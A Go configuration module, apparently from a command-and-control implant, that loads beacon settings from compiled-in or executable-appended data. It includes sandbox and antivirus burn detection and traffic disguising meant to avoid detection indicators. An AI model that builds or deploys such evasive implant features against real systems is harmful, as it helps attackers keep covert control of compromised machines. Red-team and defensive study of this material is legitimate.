package config

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// ConfigData is injected at compile time via ldflags.
var ConfigData string

// Config holds the agent runtime configuration.
type Config struct {
	ServerHost   string `json:"server_host"`
	ServerPort   int    `json:"server_port"`
	UseTLS           bool   `json:"use_tls"`
	Transport        string `json:"transport"`      // "tcp" (default) or "http"
	PSK              string `json:"psk"`            // pre-shared key for registration auth
	ServerFingerprint string `json:"server_fp"`      // optional SHA-256 cert pin (hex)
	Sleep        int    `json:"sleep"`     // milliseconds
	Jitter       int    `json:"jitter"`    // percentage 0-100
	KillDate     int64  `json:"kill_date"`
	RSAPublicKey string `json:"rsa_public_key"`
	// CanaryToken is a unique per-build burn-detection token. On startup the
	// agent fires a one-way /canary/<token> lookup; if a sandbox/AV runs the
	// payload, the server records a real-time burn alert.
	CanaryToken string `json:"canary_token,omitempty"`
	// TrafficProfile customizes outbound HTTP requests (Malleable-profile
	// lite). UAs are rotated per request; URIs are alternated so the C2 path
	// is not a fixed IOC.
	TrafficProfile *TrafficProfile `json:"traffic_profile,omitempty"`
}

// TrafficProfile controls per-request outbound HTTP variation.
type TrafficProfile struct {
	// UserAgents are rotated across HTTP(S) requests (default: none → Go UA).
	UserAgents []string `json:"user_agents,omitempty"`
	// URIs replace the fixed /api/v1/{register,checkin} paths. Each entry is a
	// full path like "/wp-login.php"; the index rotates per request. When set,
	// URIs[0] is used for register and subsequent entries for checkins.
	URIs []string `json:"uris,omitempty"`
	// RegisterURI / CheckinURI / PubKeyURI pin specific paths (from the
	// listener's Malleable profile). When set they take precedence over URIs.
	RegisterURI string `json:"register_uri,omitempty"`
	CheckinURI  string `json:"checkin_uri,omitempty"`
	PubKeyURI   string `json:"pubkey_uri,omitempty"`
}

// Load parses the injected config data. When the binary was not built with a
// compiled-in config (template payloads), the config is read from the overlay
// appended to the end of the executable.
func Load() (*Config, error) {
	cfgB64 := ConfigData
	if cfgB64 == "" {
		b64, err := loadOverlayConfig()
		if err != nil {
			return nil, fmt.Errorf("no config data (not built with ldflags and no overlay): %w", err)
		}
		cfgB64 = strings.TrimSpace(b64)
	}

	data, err := base64.StdEncoding.DecodeString(cfgB64)
	if err != nil {
		return nil, fmt.Errorf("decode config: %w", err)
	}

	var cfg Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, fmt.Errorf("unmarshal config: %w", err)
	}

	// Fill sensible defaults
	if cfg.Transport == "" {
		cfg.Transport = "tcp"
	}
	if cfg.Sleep <= 0 {
		cfg.Sleep = 5000
	}

	// Defaults
	if cfg.Sleep <= 0 {
		cfg.Sleep = 5000
	}
	if cfg.Transport == "" {
		cfg.Transport = "tcp"
	}

	return &cfg, nil
}

// LoadFromArgs creates a config from command-line arguments (for development).
func LoadFromArgs(host string, port int, useTLS bool, sleep, jitter int) *Config {
	return &Config{
		ServerHost: host,
		ServerPort: port,
		UseTLS:     useTLS,
		Transport:  "tcp",
		Sleep:      sleep,
		Jitter:     jitter,
	}
}
